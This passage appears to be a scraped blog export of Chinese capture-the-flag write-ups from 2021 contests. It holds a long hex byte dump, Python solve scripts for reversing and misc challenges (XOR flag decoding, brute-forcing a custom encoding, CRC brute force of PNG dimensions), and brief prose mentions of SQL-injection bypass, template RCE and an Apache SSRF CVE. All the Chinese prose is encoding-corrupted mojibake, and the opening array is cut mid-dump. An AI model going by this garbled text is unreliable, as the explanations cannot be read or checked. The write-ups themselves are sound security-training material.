0x63, 0x30, 0x62, 0x66, 0x31, 0x37, 0x37, 0x65, 0x36, 0x63, 0x39, 0x38, 0x39, 0x39, 0x65, 0x64, 0x37, 0x30, 0x37, 0x64, 0x63, 0x63, 0x34, 0x61, 0x37, 0x32, 0x36, 0x63, 0x62, 0x31, 0x34, 0x63, 0x31, 0x61, 0x36, 0x39, 0x62, 0x30, 0x63, 0x34, 0x61, 0x30, 0x32, 0x34, 0x37, 0x34, 0x38, 0x30, 0x36, 0x66, 0x61, 0x37, 0x33, 0x63, 0x66, 0x62, 0x31, 0x30, 0x65, 0x31, 0x30, 0x66, 0x37, 0x62, 0x31, 0x36, 0x36, 0x35, 0x30, 0x32, 0x31, 0x63, 0x32, 0x34, 0x37, 0x36, 0x32, 0x62, 0x36, 0x65, 0x64, 0x61, 0x64, 0x36, 0x35, 0x63, 0x61, 0x36, 0x33, 0x63, 0x65, 0x61, 0x33, 0x63, 0x37, 0x32, 0x65, 0x30, 0x64, 0x34, 0x65, 0x34, 0x63, 0x61, 0x33, 0x66, 0x39, 0x38, 0x33, 0x30, 0x31, 0x31, 0x37, 0x33, 0x65, 0x65, 0x63, 0x33, 0x32, 0x35, 0x34, 0x33, 0x33, 0x37, 0x61, 0x66, 0x31, 0x66, 0x35, 0x61, 0x31, 0x31, 0x66, 0x37, 0x37, 0x39, 0x65, 0x63, 0x62, 0x65, 0x30, 0x34, 0x64, 0x31, 0x62, 0x37, 0x34, 0x64, 0x35, 0x33, 0x66, 0x35, 0x38, 0x33, 0x35, 0x65, 0x30, 0x31, 0x31, 0x32, 0x32, 0x32, 0x31, 0x35, 0x35, 0x61, 0x35, 0x36, 0x66, 0x39, 0x37, 0x65, 0x30, 0x30, 0x64, 0x37, 0x35, 0x33, 0x37, 0x34, 0x63, 0x64, 0x39, 0x33, 0x30, 0x38, 0x30, 0x64, 0x66, 0x61, 0x30, 0x38, 0x37, 0x63, 0x64, 0x33, 0x35, 0x36, 0x61, 0x39, 0x39, 0x66, 0x65, 0x31, 0x65, 0x65, 0x62, 0x66, 0x35, 0x64, 0x36, 0x64, 0x35, 0x65, 0x33, 0x31, 0x38, 0x34, 0x36, 0x61, 0x61, 0x64, 0x35, 0x32, 0x35, 0x32, 0x63, 0x33, 0x61, 0x31, 0x37, 0x61, 0x34, 0x36, 0x35, 0x36, 0x65, 0x32, 0x65, 0x32, 0x31, 0x30, 0x63, 0x65, 0x31, 0x63, 0x37, 0x61, 0x61, 0x34, 0x64, 0x31, 0x34, 0x37, 0x66, 0x62, 0x38, 0x63, 0x66, 0x34, 0x34, 0x30, 0x61, 0x35, 0x30, 0x61, 0x64, 0x64, 0x36, 0x31, 0x62, 0x62, 0x62, 0x32, 0x65, 0x63, 0x32, 0x39, 0x39, 0x61, 0x32, 0x65, 0x30, 0x64, 0x61, 0x62, 0x30, 0x62, 0x34, 0x35, 0x30, 0x34, 0x37, 0x39, 0x36, 0x61, 0x63, 0x33, 0x61, 0x38, 0x39, 0x39, 0x64, 0x61, 0x35, 0x35, 0x33, 0x61, 0x62, 0x31, 0x64, 0x38, 0x33, 0x35, 0x37, 0x36, 0x36, 0x39, 0x31, 0x61, 0x62, 0x32, 0x33, 0x34, 0x30, 0x39, 0x64, 0x31, 0x38, 0x33, 0x39, 0x38, 0x30, 0x31, 0x34, 0x62, 0x33, 0x62, 0x35, 0x65, 0x61, 0x66, 0x31, 0x32, 0x65, 0x38, 0x33, 0x66, 0x34, 0x64, 0x39, 0x39, 0x61, 0x61, 0x30, 0x39, 0x65, 0x31, 0x65, 0x34, 0x65, 0x34, 0x63, 0x61, 0x65, 0x31, 0x33, 0x33, 0x35, 0x33, 0x30, 0x37, 0x33, 0x30, 0x63, 0x31, 0x31, 0x33, 0x33, 0x64, 0x61, 0x32, 0x62, 0x33, 0x64, 0x65, 0x65, 0x33, 0x37, 0x62, 0x35, 0x38, 0x65, 0x62, 0x31, 0x61, 0x35, 0x37, 0x39, 0x35, 0x62, 0x32, 0x32, 0x31, 0x65, 0x63, 0x35, 0x61, 0x38, 0x38, 0x33, 0x30, 0x37, 0x33, 0x31, 0x61, 0x34, 0x31, 0x31, 0x36, 0x37, 0x64, 0x32, 0x39, 0x35, 0x66, 0x39, 0x65, 0x31, 0x62, 0x30, 0x32, 0x30, 0x33, 0x30, 0x31, 0x30, 0x30, 0x30, 0x31, 0x33, 0x30, 0x30, 0x64, 0x30, 0x36, 0x30, 0x39, 0x32, 0x61, 0x38, 0x36, 0x34, 0x38, 0x38, 0x36, 0x66, 0x37, 0x30, 0x64, 0x30, 0x31, 0x30, 0x31, 0x30, 0x35, 0x30, 0x35, 0x30, 0x30, 0x30, 0x33, 0x38, 0x32, 0x30, 0x31, 0x30, 0x31, 0x30, 0x30, 0x30, 0x65, 0x34, 0x37, 0x34, 0x30, 0x32, 0x33, 0x35, 0x65, 0x39, 0x63, 0x66, 0x32, 0x62, 0x65, 0x33, 0x33, 0x64, 0x65, 0x33, 0x65, 0x30, 0x36, 0x64, 0x37, 0x37, 0x37, 0x31, 0x33, 0x39, 0x63, 0x62, 0x62, 0x63, 0x35, 0x63, 0x66, 0x30, 0x36, 0x32, 0x32, 0x32, 0x38, 0x35, 0x63, 0x31, 0x37, 0x64, 0x61, 0x30, 0x34, 0x36, 0x39, 0x37, 0x62, 0x38, 0x30, 0x36, 0x37, 0x33, 0x31, 0x38, 0x61, 0x61, 0x66, 0x38, 0x64, 0x66, 0x30, 0x66, 0x62, 0x62, 0x34, 0x64, 0x33, 0x31, 0x36, 0x36, 0x66, 0x32, 0x39, 0x33, 0x65, 0x61, 0x31, 0x35, 0x61, 0x61, 0x32, 0x35, 0x39, 0x32, 0x66, 0x30, 0x36, 0x65, 0x62, 0x36, 0x39, 0x32, 0x39, 0x61, 0x66, 0x30, 0x36, 0x33, 0x37, 0x32, 0x32, 0x61, 0x63, 0x39, 0x66, 0x33, 0x30, 0x61, 0x64, 0x38, 0x35, 0x65, 0x32, 0x63, 0x30, 0x38, 0x37, 0x35, 0x36, 0x34, 0x39, 0x33, 0x31, 0x64, 0x36, 0x61, 0x63, 0x36, 0x35, 0x66, 0x63, 0x64, 0x35, 0x66, 0x62, 0x63, 0x38, 0x36, 0x34, 0x62, 0x33, 0x64, 0x63, 0x39, 0x38, 0x34, 0x31, 0x65, 0x30, 0x33, 0x39, 0x63, 0x36, 0x65, 0x31, 0x64, 0x35, 0x66, 0x62, 0x63, 0x35, 0x63, 0x32, 0x66, 0x38, 0x61, 0x64, 0x66, 0x39, 0x30, 0x61, 0x35, 0x34, 0x37, 0x62, 0x63, 0x34, 0x65, 0x62, 0x63, 0x30, 0x37, 0x64, 0x33, 0x38, 0x37, 0x39, 0x31, 0x34, 0x64, 0x62, 0x32, 0x34, 0x34, 0x35, 0x31, 0x63, 0x32, 0x63, 0x63, 0x38, 0x39, 0x39, 0x32, 0x35, 0x33, 0x35, 0x39, 0x62, 0x64, 0x33, 0x62, 0x62, 0x30, 0x37, 0x35, 0x30, 0x63, 0x37, 0x61, 0x61, 0x62, 0x66, 0x39, 0x64, 0x37, 0x34, 0x33, 0x62, 0x31, 0x38, 0x39, 0x33, 0x65, 0x39, 0x38, 0x62, 0x62, 0x63, 0x38, 0x66, 0x66, 0x37, 0x34, 0x62, 0x32, 0x34, 0x66, 0x63, 0x30, 0x62, 0x34, 0x62, 0x65, 0x32, 0x64, 0x62, 0x61, 0x61, 0x66, 0x31, 0x63, 0x39, 0x31, 0x37, 0x62, 0x62, 0x61, 0x30, 0x31, 0x34, 0x39, 0x36, 0x64, 0x30, 0x36, 0x31, 0x37, 0x66, 0x66, 0x63, 0x33, 0x61, 0x34, 0x61, 0x38, 0x62, 0x37, 0x61, 0x36, 0x65, 0x37, 0x39, 0x61, 0x33, 0x30, 0x33, 0x36, 0x32, 0x39, 0x38, 0x61, 0x36, 0x65, 0x62, 0x66, 0x35, 0x37, 0x62, 0x62, 0x30, 0x30, 0x30, 0x30, 0x31, 0x65, 0x34, 0x33, 0x61, 0x30, 0x62, 0x32, 0x34, 0x32, 0x38, 0x36, 0x34, 0x65, 0x65, 0x62, 0x62, 0x30, 0x66, 0x63, 0x65, 0x63, 0x39, 0x65, 0x33, 0x32, 0x33, 0x31, 0x34, 0x34, 0x64, 0x34, 0x34, 0x34, 0x37, 0x63, 0x38, 0x37, 0x38, 0x34, 0x33, 0x30, 0x66, 0x31, 0x38, 0x65, 0x36, 0x65, 0x33, 0x35, 0x38, 0x61, 0x64, 0x39, 0x37, 0x35, 0x36, 0x36, 0x66, 0x61, 0x30, 0x34, 0x64, 0x31, 0x66, 0x30, 0x37, 0x62, 0x31, 0x37, 0x31, 0x63, 0x31, 0x34, 0x37, 0x36, 0x63, 0x39, 0x61, 0x66, 0x35, 0x61, 0x31, 0x65, 0x62, 0x61, 0x30, 0x62, 0x66, 0x36, 0x36, 0x31, 0x36, 0x65, 0x32, 0x31, 0x39, 0x63, 0x30, 0x62, 0x39, 0x65, 0x31, 0x32, 0x39, 0x39, 0x64, 0x30, 0x39, 0x66, 0x65, 0x63, 0x64, 0x65, 0x64, 0x32, 0x34, 0x61, 0x38, 0x38, 0x30, 0x33, 0x39, 0x37, 0x66, 0x39, 0x32, 0x65, 0x30, 0x66, 0x39, 0x39, 0x64, 0x38, 0x39, 0x35, 0x31, 0x32, 0x32, 0x38, 0x63, 0x37, 0x37, 0x37, 0x30, 0x63, 0x31, 0x38, 0x34, 0x66, 0x64, 0x37, 0x37, 0x61, 0x64, 0x66, 0x66, 0x39, 0x34, 0x33, 0x62, 0x66, 0x63, 0x38, 0x62, 0x36, 0x61, 0x61, 0x35, 0x32, 0x34, 0x63, 0x35, 0x66, 0x30, 0x61, 0x36, 0x64, 0x37, 0x36, 0x38, 0x36, 0x66, 0x65, 0x33, 0x35, 0x34, 0x38, 0x36, 0x0, 0x20, 0x2a, 0x20, 0x72, 0x61, 0x64, 0x69, 0x69, 0x20, 0x2b, 0x20, 0x61, 0x61, 0x5f, 0x6f, 0x75, 0x74, 0x73, 0x65, 0x74, 0x3b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x1, 0xcb, 0x8, 0x7c, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x50, 0x72, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x3f, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x3d, 0x20, 0x63, 0x6f, 0x72, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x5f, 0x6f, 0x75, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0xc4, 0xe, 0x77, 0x7b, 0x0, 0x0, 0x0, 0x18, 0xc5, 0xe, 0x77, 0x7b, 0x0, 0x0, 0x0, 0x28, 0xc9, 0xe, 0x77, 0x7b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x49, 0x1a, 0x77, 0x7b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6c, 0x69, 0x6e, 0x65, 0x61, 0x72, 0x5f, 0x63, 0x6f, 0x76, 0x65, 0x72, 0x61, 0x67, 0x65, 0x20, 0x3d, 0x20, 0x61, 0x61, 0x5f, 0x62, 0x6c, 0x6f, 0x61, 0x74, 0x5f, 0x61, 0x6e, 0x64, 0x5f, 0x63, 0x6f, 0x76, 0x65, 0x72, 0x61, 0x67, 0x65, 0x2e, 0x77, 0x3b, 0x66, 0x6c, 0x6f, 0x61, 0x74, 0x32, 0x20, 0x70, 0x69, 0x78, 0x65, 0x6c, 0x6c, 0x65, 0x6e, 0x67, 0x74, 0x68, 0x20, 0x3d, 0x20, 0x69, 0x6e, 0x76, 0x65, 0x72, 0x73, 0x65, 0x73, 0x71, 0x72, 0x74, 0x28, 0x66, 0x6c, 0x6f, 0x61, 0x74, 0x32, 0x28, 0x64, 0x6f, 0x74, 0x28, 0x73, 0x6b, 0x65, 0x77, 0x2e, 0x78, 0x7a, 0x2c, 0x20, 0x73, 0x6b, 0x65, 0x77, 0x2e, 0x78, 0x7a, 0x29, 0x2c, 0x20, 0x64, 0x6f, 0x74, 0x28, 0x73, 0x6b, 0x65, 0x77, 0x2e, 0x79, 0x77, 0x2c, 0x20, 0x73, 0x6b, 0x65, 0x77, 0x2e, 0x79, 0x77, 0x29, 0x29, 0x29, 0x3b, 0x66, 0x6c, 0x6f, 0x61, 0x74, 0x34, 0x20, 0x6e, 0x6f, 0x72, 0x6d, 0x61, 0x6c, 0x69, 0x7a, 0x65, 0x64, 0x5f, 0x61, 0x78, 0x69, 0x73, 0x5f, 0x64, 0x69, 0x72, 0x73, 0x20, 0x3d, 0x20, 0x73, 0x6b, 0x65, 0x77, 0x20, 0x2a, 0x20, 0x70, 0x69, 0x78, 0x65, 0x6c, 0x6c, 0x65, 0x6e, 0x67, 0x74, 0x68, 0x2e, 0x78, 0x79, 0x78, 0x79, 0x3b, 0x66, 0x6c, 0x6f, 0x61, 0x74, 0x32, 0x20, 0x61, 0x78, 0x69, 0x73, 0x77, 0x69, 0x64, 0x74, 0x68, 0x73, 0x20, 0x3d, 0x20, 0x28, 0x61, 0x62, 0x73, 0x28, 0x6e, 0x6f, 0x72, 0x6d, 0x61, 0x6c, 0x69, 0x7a, 0x65, 0x64, 0x5f, 0x61, 0x78, 0x69, 0x73, 0x5f, 0x64, 0x69, 0x72, 0x73, 0x2e, 0x78, 0x79, 0x29] for i in range(42): target[i] = (target[i] &lt;&lt; 3) | (target[i] &gt;&gt; 5); target[0] ^= sig[327]; for i in range(1, 42): target[i] ^= sig[354 + 27 * (i - 1)] + i; print(''.join(map(lambda x: chr(x &amp; 0xff), target))); ooo å¦‚ä½•è§£å‘¢ï¼Ÿ é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ ä½¿ç”¨è¾“å…¥å­—ç¬¦ä¸²çš„ç¬¬7ã€8ã€9ä½å¼‚æˆ–çš„å€¼å¯¹å…¨å­—ç¬¦ä¸²è¿›è¡Œå¼‚æˆ–ï¼Œå¹¶äºæœ€ç»ˆç»“æœè¿›è¡Œæ¯”è¾ƒã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯æœ€ç»ˆç»“æœçš„7ã€8ã€9ä½å¼‚æˆ–å¹¶ä¸ä¸º0ï¼Œè¯´æ˜è¯¥æ®µå†…å­˜ä¸­çš„å€¼è¢«æ”¹å˜è¿‡ï¼Œå¯ä»¥æ‰¾åˆ°åœ¨401D94å¤„çš„å‡½æ•°å¯¹æœ€ç»ˆç»“æœåšäº†ä¸€ä¸ªå¼‚æˆ–0x17çš„æ“ä½œã€‚ çŒœæµ‹ flag ç¬¬ä¸€ä½ä¸º fï¼Œå³å¯è§£å‡ºè¯¥é¢˜ã€‚ key = [17,283,534,784,1036,1350,1604,1809,2116,2370,2625,2881,3140,3418,3650,3911,4118,4419,4698,4931,5184,5440,5653,5978,6213,6464,6735,6933,7258,7445,7744,8006,8262,8519,8773,9025,9233,9489,9792,10006,10259,10506] key = [i ^ 0x17 for i in key] print(''.join([chr((i ^ key[0] ^ ord('f')) &amp; 0xff) for i in key])) mod èŠ±èŠ±æ€»å–œæ¬¢æŠŠä¸œè¥¿éšè—èµ·æ¥ã€‚ é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ ä»£ç ä¸­å­˜åœ¨ä¸¤å¤„èŠ±æŒ‡ä»¤ï¼Œåˆ†åˆ«ä¸º4013E4ä¸401203ã€‚ å»é™¤èŠ±æŒ‡ä»¤åï¼Œå¯ä»¥çœ‹å‡ºä»£ç å¯¹è¾“å…¥è¿›è¡Œä¸‰ä¸ªä¸€ç»„çš„ç¼–ç ï¼Œçˆ†ç ´å³å¯ã€‚ charset = 'ABCDFEGH1JKLRSTMNP0VWQUXY2a8cdefijklmnopghwxyqrstuvzOIZ34567b9+/' enc = [charset.index( i) for i in '2aYcdfL2fS1BTMMF1RSeMTTASS1OJ8RHTJdBYJ2STJfNMSMAYcKUJddp'] res = [] def f(i): for a1 in range(32, 128): for a2 in range(32, 128): for a3 in range(32, 128): a = [a1, a2, a3] if enc[4 * i] == (((a[2] &amp; 3) &lt;&lt; 2) | a[1] &amp; 0x30 | a[0] &amp; 0xC0) &gt;&gt; 2 \\ and enc[4 * i + 1] == (((a[0] &amp; 3) &lt;&lt; 2) | a[2] &amp; 0x30 | a[1] &amp; 0xC0) &gt;&gt; 2 \\ and enc[4 * i + 2] == (((a[1] &amp; 3) &lt;&lt; 2) | a[0] &amp; 0x30 | a[2] &amp; 0xC0) &gt;&gt; 2 \\ and enc[4 * i + 3] == (a[2] &amp; 0xC | (a[1] &lt;&lt; 2) &amp; 0x30 | (a[0] &lt;&lt; 4) &amp; 0xC0) &gt;&gt; 2: print(''.join(map(chr, a)), end='') return for i in range(0, len(enc) // 4): f(i) print() # flag{5a073724-8223-413d-11fa-d53b133df89e} å°ç»“å¾€å¹´çš„è¿™ä¸ªæ¯”èµ›éƒ½æŒºæ°´çš„ï¼Œä¸è¿‡ä¸æ‡‚ä¸ºå•¥ï¼Œä»Šå¹´å¼€å§‹è¿™æ¯”èµ›ä¹Ÿå·èµ·æ¥äº†ã€‚ æ¯”å¦‚è¿™æ¬¡çš„ web é¢˜è¿˜æ˜¯æŒºéš¾çš„ï¼Œæœ‰é“ Java é¢˜ç›®è¦è‡ªå·±æ„é€ æ¶æ„ç±»è¿›è¡Œååºåˆ—åŒ–ï¼Œå¯æƒœå–µå–µç›®å‰è¿˜ä¸ä¼š Javaï¼Œå…¶ä»–å¸ˆå‚…è¯´ä¼š Java å°±èƒ½å‡ºï¼Œå–µå–µå“­å“­ã€‚ æœ‰ä¸ª nodejs è€ƒçš„æ˜¯æ•°ç»„ bypass SQL æ³¨å…¥ + hbs æ¨¡æ¿å¼•æ“ RCEï¼Œè¿˜æ˜¯æœ‰ç‚¹å·§å¦™çš„ï¼Œå’±æ²¡æƒ³åˆ°ã€‚ ä¸œåæ¯2021-WEB-WriteUp eznode ä¸œåæ¯WEB èµ›åå¤ç° è¿˜æœ‰ä¸ª Apache çš„åä»£ï¼Œå†…ç½‘æ˜¯ä¸ª weblogicï¼Œå¬è¯´å°±ä¸¤ä¸ª CVE ä¸€æ‰“å°±è¡Œï¼Œç„¶è€Œå–µå–µä¸ä¼šï¼Œå‘œå‘œã€‚ Apache mod_proxy SSRFï¼ˆCVE-2021-40438ï¼‰çš„ä¸€ç‚¹åˆ†æå’Œå»¶ä¼¸ å™¢ä½ é—®æˆ‘ä¸ºå•¥ä¸åš pwnï¼Œå› ä¸ºé˜Ÿå‹å­¦å¼Ÿçœ‹åˆ°å †é¢˜ç›´æ¥è·‘äº†ï¼ˆæ‘Šæ‰‹.jpgï¼Œæ€ä¹ˆå¤§å®¶éƒ½ä¼š pwn å•Š å–µå–µå¥½èœå•Šï¼ï¼ï¼ æ‘¸äº†æ‘¸äº†ï¼Œå’±å…¨å›½æ€»æ’å 43ï¼Œä¸Šæµ·å¸‚æ’ç¬¬ä¸‰ï¼Œå–µå–µæ‘¸å¤§é±¼å»äº†ã€‚ ï¼ˆç¬‘æ­»ï¼Œè¿™æ¯”èµ›ä¸Šæµ·å°±æ²¡å•¥é˜Ÿä¼æ‰“çš„äºšå­ï¼Œç­¾ä¸ªåˆ°éƒ½èƒ½è¿›å†³èµ› å†çœ‹çœ‹å‰é¢çš„å¤§ä½¬æœ‰å¤šå·ï¼Œå–µå‘œï¼ ï¼ˆæºœäº†æºœäº†å–µ~","path":"2021/11/02/CTF_2021donghua/"},{"title":"CTF | 2021 ç¬¬å››å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› SU WriteUp","text":"å¼•è¨€ ç¬¬å››å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› - çº¿ä¸Šé¢„é€‰èµ› æ¯”èµ›æ—¶é—´: 2021-10-23 09:00 ~ 2021-10-25 09:00 æ¯”èµ›å®˜ç½‘: http://nest.pmlabs.com.cn/ åˆæ˜¯ä¸ª48hçš„æ¯”èµ›ï¼Œçº¿ä¸Šèµ›å…¶å®å’Œæ‹Ÿæ€é˜²å¾¡å…³ç³»ä¸å¤§ï¼Œçœ‹èµ·æ¥å†³èµ›æ‰æ˜¯çœŸæ‹Ÿæ€ï¼ˆ è¿™æ¬¡æ¯”èµ›å–µå–µæ˜¯å’Œ SU æˆ˜é˜Ÿçš„å¸ˆå‚…ä»¬ä¸€èµ·æ‰“çš„ï¼Œæœ€åé˜Ÿå‹æˆåŠŸå¸¦é£ï¼Œæ‰“åˆ°äº†ç¬¬äºŒåã€‚ ç”±äºè¿™å‘¨æœ«æ¯”èµ›æœ‰ç‚¹å¤šï¼Œè¿™ä¸ªæ¯”èµ›å–µå–µåªæ˜¯éšä¾¿çœ‹äº†çœ‹ misc é¢˜ç›®è¿™æ ·ï¼Œä¸»è¦è¿˜æ˜¯é˜Ÿå‹åœ¨å‡ºåŠ›ï¼Œé˜Ÿå‹ä»¬è¾›è‹¦äº†ï¼ŒOrzï¼ è¿™é‡Œç›´æ¥æŠŠæˆ˜é˜Ÿçš„ writeup è½¬è¿‡æ¥äº†å–µ~ ï¼ˆå¦‚æœè½¬è¿‡æ¥çš„æ—¶å€™å“ªé‡Œé”…äº†å¯ä»¥å»çœ‹åŸæ–‡ æœ¬æ¬¡å¼ºç½‘æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ›æˆ‘ä»¬ SU å–å¾—äº†çº¿ä¸Šèµ› 2nd çš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.comæˆ–ç›´æ¥è”ç³»ä¹¦é±¼(QQ:381382770) ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ å¼ºç½‘æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› çš„ writeupã€‚ ä½œè€…: Suersé“¾æ¥: https://team-su.github.io/passages/2021-10-24-NTFY/æ¥æº: team-su.github.ioè‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ miscweirdphotoçˆ†ç ´é«˜å®½ï¼Œè¿›è€Œå¾—åˆ°å­—ç¬¦ä¸²ï¼šTIEWOFTHSAEOUIITNRBCOSHSTSAN é™„ä¸Šçˆ†ç ´è„šæœ¬ import binascii import struct crcbp = open(\"1.png\", \"rb\").read() for i in range(2000): for j in range(2000): data = crcbp[12:16] + struct.pack('&gt;i', i)+struct.pack('&gt;i', j)+crcbp[24:29] crc32 = binascii.crc32(data) &amp; 0xffffffff if(crc32 == 0x9E916964): print('hex:', hex(i), hex(j)) #hex: 0x58c 0x1f4 æ¥ç€å°±çº¯é çŒœä¸æ–­å°è¯•æœ€åç¡®è®¤æ˜¯æ …æ å¯†ç ï¼ˆkey=4ï¼‰å¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼šTHISISTHEANSWERTOOBSFUCATION è§£å‹æŸ¥çœ‹æ–‡ä»¶å¤´å¾ˆæ˜æ˜¾è¿™æ˜¯ä¸€ä¸ªpdfæ–‡ä»¶ï¼Œ010æ›´æ”¹ä¸‹pdfå¤´ æœ€åé€šè¿‡å·¥å…·wbs43openè§£å¯†å¾—åˆ°flagï¼šflag{th1s_ls_thE_f1n4l_F14g_y0u_want} bluewhaleè¿½è¸ªtcpæµå‘ç°äº†passwordï¼šth1sIsThEpassw0rD æ¥ç€æˆ‘ä»¬è¿›è¡Œæ˜æ–‡æ”»å‡»å¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼š!2b$3&amp;Ec æœ€ålsbéšå†™å¾—åˆ°flagï¼šflag{F1nallY_y0uve_f0unD_1t} bar å‚è€ƒæ–‡ç« ï¼šhttps://blog.csdn.net/kzhuangood/article/details/72953354 é¦–å…ˆåˆ†ç¦»GIFæå–å‡ºæ¯ä¸€å¸§ï¼Œæ¥ç€æˆ‘ä»¬è§„å®šé»‘ä¸º1ï¼Œç™½ä¸º0ï¼Œç°ä¸ºç©ºæ ¼ï¼Œæ‘©æ–¯å¯†ç å¾—åˆ°æç¤ºï¼šCODE93 1010 111 100 0 11110 00011 CODE93 ç„¶åè¿˜æ˜¯æŒ‰é»‘1ç™½0æ¥ï¼Œæ¯ä¹ä¸ªä¸ºä¸€ç»„å¯¹ç…§code93ç¼–ç è¡¨å¾—åˆ°ï¼š F0C62DB973684DBDA896F9C5F6D962 ï¼ˆåé¢è¿˜æœ‰ä¸€å¤§å—ç©ºç™½çš„æ˜¯éœ€è¦æˆ‘ä»¬å»ç®—çš„æ•ˆéªŒä½ æ¥ç€æˆ‘ä»¬é€šè¿‡åœ¨çº¿ç½‘ç«™è¾“å…¥æ¡ç å·ç”Ÿæˆæ¡å½¢ç ï¼Œè€Œå®ƒè¿™æ ¡éªŒä½å…¶å®æ˜¯å·²ç»è‡ªåŠ¨ç®—å‡ºæ¥çš„ï¼Œæˆ‘ä»¬åªè¦æ ¹æ®å…¶ç»“æ„å³å¯å¾—åˆ°æœ€åä¸¤ä½ hintï¼š1ã€è§‚å¯Ÿå¾—åˆ°å­—ç¬¦ä¸²åœ¨code93åœ¨çº¿ç½‘ç«™ç”Ÿæˆçš„æ¡å½¢ç åœæ­¢å­—ç¬¦çš„å‰ä¸¤ä½å­—ç¬¦ 2ã€flagå†…å®¹éƒ½æ˜¯å°å†™è‹±æ–‡å­—æ¯ æœ€åæ ¹æ®hintå¾—çŸ¥åº”è¯¥æ˜¯å°å†™çš„ï¼Œè¿›è€Œå¾—çŸ¥æœ€åä¸¤ä½æ ¡éªŒç ä¸ºUå’ŒM å¤§å†™æƒ…å†µï¼š 101000100 101101100 111010010 101011110 1 2 W SPACE * Start/Stop ç»ˆæ­¢æ¡ å°å†™æƒ…å†µï¼š 101000100 110010110 101001100 101011110 1 2 U M * Start/Stop ç»ˆæ­¢æ¡ æ•´ç†å¾—åˆ°flagï¼šflag{f0c62db973684dbda896f9c5f6d962um} mirror010æ‰“å¼€åŸå›¾æ‹‰åˆ°å°¾éƒ¨ä¹Ÿå‘ç°äº†pngå¤´ï¼Œå¹¶ä¸”å‘ç°æŠŠå›¾ç‰‡æ•°æ®æ¯16ä¸€ç»„å€’è¿‡æ¥ä¹Ÿæ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œè„šæœ¬å€’ç½®ä¸€ä¸‹ data = open('full.png', 'rb').read() data = data[::-1] data = [data[i:i+16][::-1] for i in range(0, len(data), 16)] # print(data[0]) print(len(data)) res = b''.join(data) f = open('flag.png', 'wb') f.write(res) f.close() è·ŸåŸå›¾çœ‹èµ·æ¥ä¸€æ¨¡ä¸€æ ·ï¼Œé‚£ä¹ˆè€ƒè™‘ç›²æ°´å°ï¼Œä½†crcæ 